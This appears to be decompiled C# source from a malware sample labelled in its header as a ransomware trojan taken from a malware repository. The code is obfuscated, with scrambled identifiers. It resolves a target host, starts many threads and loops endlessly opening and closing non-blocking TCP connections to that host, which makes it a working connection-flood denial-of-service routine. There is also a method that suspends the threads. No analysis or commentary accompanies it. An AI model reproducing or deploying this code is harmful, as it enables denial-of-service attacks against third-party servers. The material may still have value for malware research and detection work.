// Decompiled with JetBrains decompiler
// Type: BZDhfNCWNDRbKKxxYhtWpVs
// Assembly: AutoCheckBlackmarket, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 75EFCFBA-7DC9-4B3B-BE71-9373569A5CFD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.10-msil\HEUR-Trojan-Ransom.Win32.Generic-8865821e232bb31b1db7b1220c933ee51fd7508af48d79d1e7882dd1bf624f62.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

public class BZDhfNCWNDRbKKxxYhtWpVs
{
  private static ThreadStart[] LXLICURoYiokwNOjluSzdsZ;
  private static Thread[] fyHwcXXWbMFMqRDTWZRpTxh;
  public static string dSmdUhrbaOzbxKYGXJNnbZT;
  private static IPEndPoint liFayFBNQfBCLVQtJbvPJye;
  public static int nomrcVcHUTjmphHVOygiDfk;
  private static BZDhfNCWNDRbKKxxYhtWpVs.IEPgvRFOlgKMsMSaPuEFDIf[] xJdqeQrONoWnZdEepjCyVrQ;
  public static int lsXkjzEGxXmePwyTvBPLtHg;
  public static int hIRdFZEcuUuGzSBYISYUgwM;

  public static void TVeCwacJPiqfLHHGLvDKaBz()
  {
    try
    {
      BZDhfNCWNDRbKKxxYhtWpVs.liFayFBNQfBCLVQtJbvPJye = new IPEndPoint(Dns.GetHostEntry(BZDhfNCWNDRbKKxxYhtWpVs.dSmdUhrbaOzbxKYGXJNnbZT).AddressList[0], BZDhfNCWNDRbKKxxYhtWpVs.nomrcVcHUTjmphHVOygiDfk);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      BZDhfNCWNDRbKKxxYhtWpVs.liFayFBNQfBCLVQtJbvPJye = new IPEndPoint(IPAddress.Parse(BZDhfNCWNDRbKKxxYhtWpVs.dSmdUhrbaOzbxKYGXJNnbZT), BZDhfNCWNDRbKKxxYhtWpVs.nomrcVcHUTjmphHVOygiDfk);
      ProjectData.ClearProjectError();
    }
    BZDhfNCWNDRbKKxxYhtWpVs.fyHwcXXWbMFMqRDTWZRpTxh = new Thread[checked (BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM - 1 + 1)];
    BZDhfNCWNDRbKKxxYhtWpVs.LXLICURoYiokwNOjluSzdsZ = new ThreadStart[checked (BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM - 1 + 1)];
    BZDhfNCWNDRbKKxxYhtWpVs.xJdqeQrONoWnZdEepjCyVrQ = new BZDhfNCWNDRbKKxxYhtWpVs.IEPgvRFOlgKMsMSaPuEFDIf[checked (BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM - 1 + 1)];
    int num = checked (BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM - 1);
    int index = 0;
    while (index <= num)
    {
      BZDhfNCWNDRbKKxxYhtWpVs.xJdqeQrONoWnZdEepjCyVrQ[index] = new BZDhfNCWNDRbKKxxYhtWpVs.IEPgvRFOlgKMsMSaPuEFDIf(BZDhfNCWNDRbKKxxYhtWpVs.liFayFBNQfBCLVQtJbvPJye, BZDhfNCWNDRbKKxxYhtWpVs.lsXkjzEGxXmePwyTvBPLtHg);
      BZDhfNCWNDRbKKxxYhtWpVs.LXLICURoYiokwNOjluSzdsZ[index] = new ThreadStart(BZDhfNCWNDRbKKxxYhtWpVs.xJdqeQrONoWnZdEepjCyVrQ[index].Send);
      BZDhfNCWNDRbKKxxYhtWpVs.fyHwcXXWbMFMqRDTWZRpTxh[index] = new Thread(BZDhfNCWNDRbKKxxYhtWpVs.LXLICURoYiokwNOjluSzdsZ[index]);
      BZDhfNCWNDRbKKxxYhtWpVs.fyHwcXXWbMFMqRDTWZRpTxh[index].Start();
      checked { ++index; }
    }
  }

  public static void QGJBZDhfNCWNDRbKKxxYhtW()
  {
    int num = checked (BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM - 1);
    int index = 0;
    while (index <= num)
    {
      try
      {
        BZDhfNCWNDRbKKxxYhtWpVs.fyHwcXXWbMFMqRDTWZRpTxh[index].Suspend();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        BZDhfNCWNDRbKKxxYhtWpVs.fyHwcXXWbMFMqRDTWZRpTxh[index].Suspend();
        ProjectData.ClearProjectError();
      }
      checked { ++index; }
    }
  }

  private class IEPgvRFOlgKMsMSaPuEFDIf
  {
    private IPEndPoint pVsLXLICURoYiokwNOjluSz;
    private Socket[] dsZfyHwcXXWbMFMqRDTWZRp;
    private int TxhdSmdUhrbaOzbxKYGXJNn;

    public IEPgvRFOlgKMsMSaPuEFDIf(IPEndPoint bZTliFayFBNQfBCLVQtJbvP, int JyenomrcVcHUTjmphHVOygi)
    {
      this.pVsLXLICURoYiokwNOjluSz = bZTliFayFBNQfBCLVQtJbvP;
      this.TxhdSmdUhrbaOzbxKYGXJNn = JyenomrcVcHUTjmphHVOygi;
    }

    public void DfkxJdqeQrONoWnZdEepjCy(IAsyncResult ar)
    {
    }

    public void Send()
    {
      while (true)
      {
        try
        {
          this.dsZfyHwcXXWbMFMqRDTWZRp = new Socket[checked (this.TxhdSmdUhrbaOzbxKYGXJNn - 1 + 1)];
          int num1 = checked (this.TxhdSmdUhrbaOzbxKYGXJNn - 1);
          int index1 = 0;
          while (index1 <= num1)
          {
            this.dsZfyHwcXXWbMFMqRDTWZRp[index1] = new Socket(this.pVsLXLICURoYiokwNOjluSz.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            this.dsZfyHwcXXWbMFMqRDTWZRp[index1].Blocking = false;
            AsyncCallback callback = new AsyncCallback(this.DfkxJdqeQrONoWnZdEepjCy);
            this.dsZfyHwcXXWbMFMqRDTWZRp[index1].BeginConnect((EndPoint) this.pVsLXLICURoYiokwNOjluSz, callback, (object) this.dsZfyHwcXXWbMFMqRDTWZRp[index1]);
            checked { ++index1; }
          }
          Thread.Sleep(250);
          int num2 = checked (this.TxhdSmdUhrbaOzbxKYGXJNn - 1);
          int index2 = 0;
          while (index2 <= num2)
          {
            if (this.dsZfyHwcXXWbMFMqRDTWZRp[index2].Connected)
              this.dsZfyHwcXXWbMFMqRDTWZRp[index2].Disconnect(false);
            this.dsZfyHwcXXWbMFMqRDTWZRp[index2].Close();
            this.dsZfyHwcXXWbMFMqRDTWZRp[index2] = (Socket) null;
            checked { ++index2; }
          }
          this.dsZfyHwcXXWbMFMqRDTWZRp = (Socket[]) null;
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          int num = checked (this.TxhdSmdUhrbaOzbxKYGXJNn - 1);
          int index = 0;
          while (index <= num)
          {
            try
            {
              if (this.dsZfyHwcXXWbMFMqRDTWZRp[index].Connected)
                this.dsZfyHwcXXWbMFMqRDTWZRp[index].Disconnect(false);
              this.dsZfyHwcXXWbMFMqRDTWZRp[index].Close();
              this.dsZfyHwcXXWbMFMqRDTWZRp[index] = (Socket) null;
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
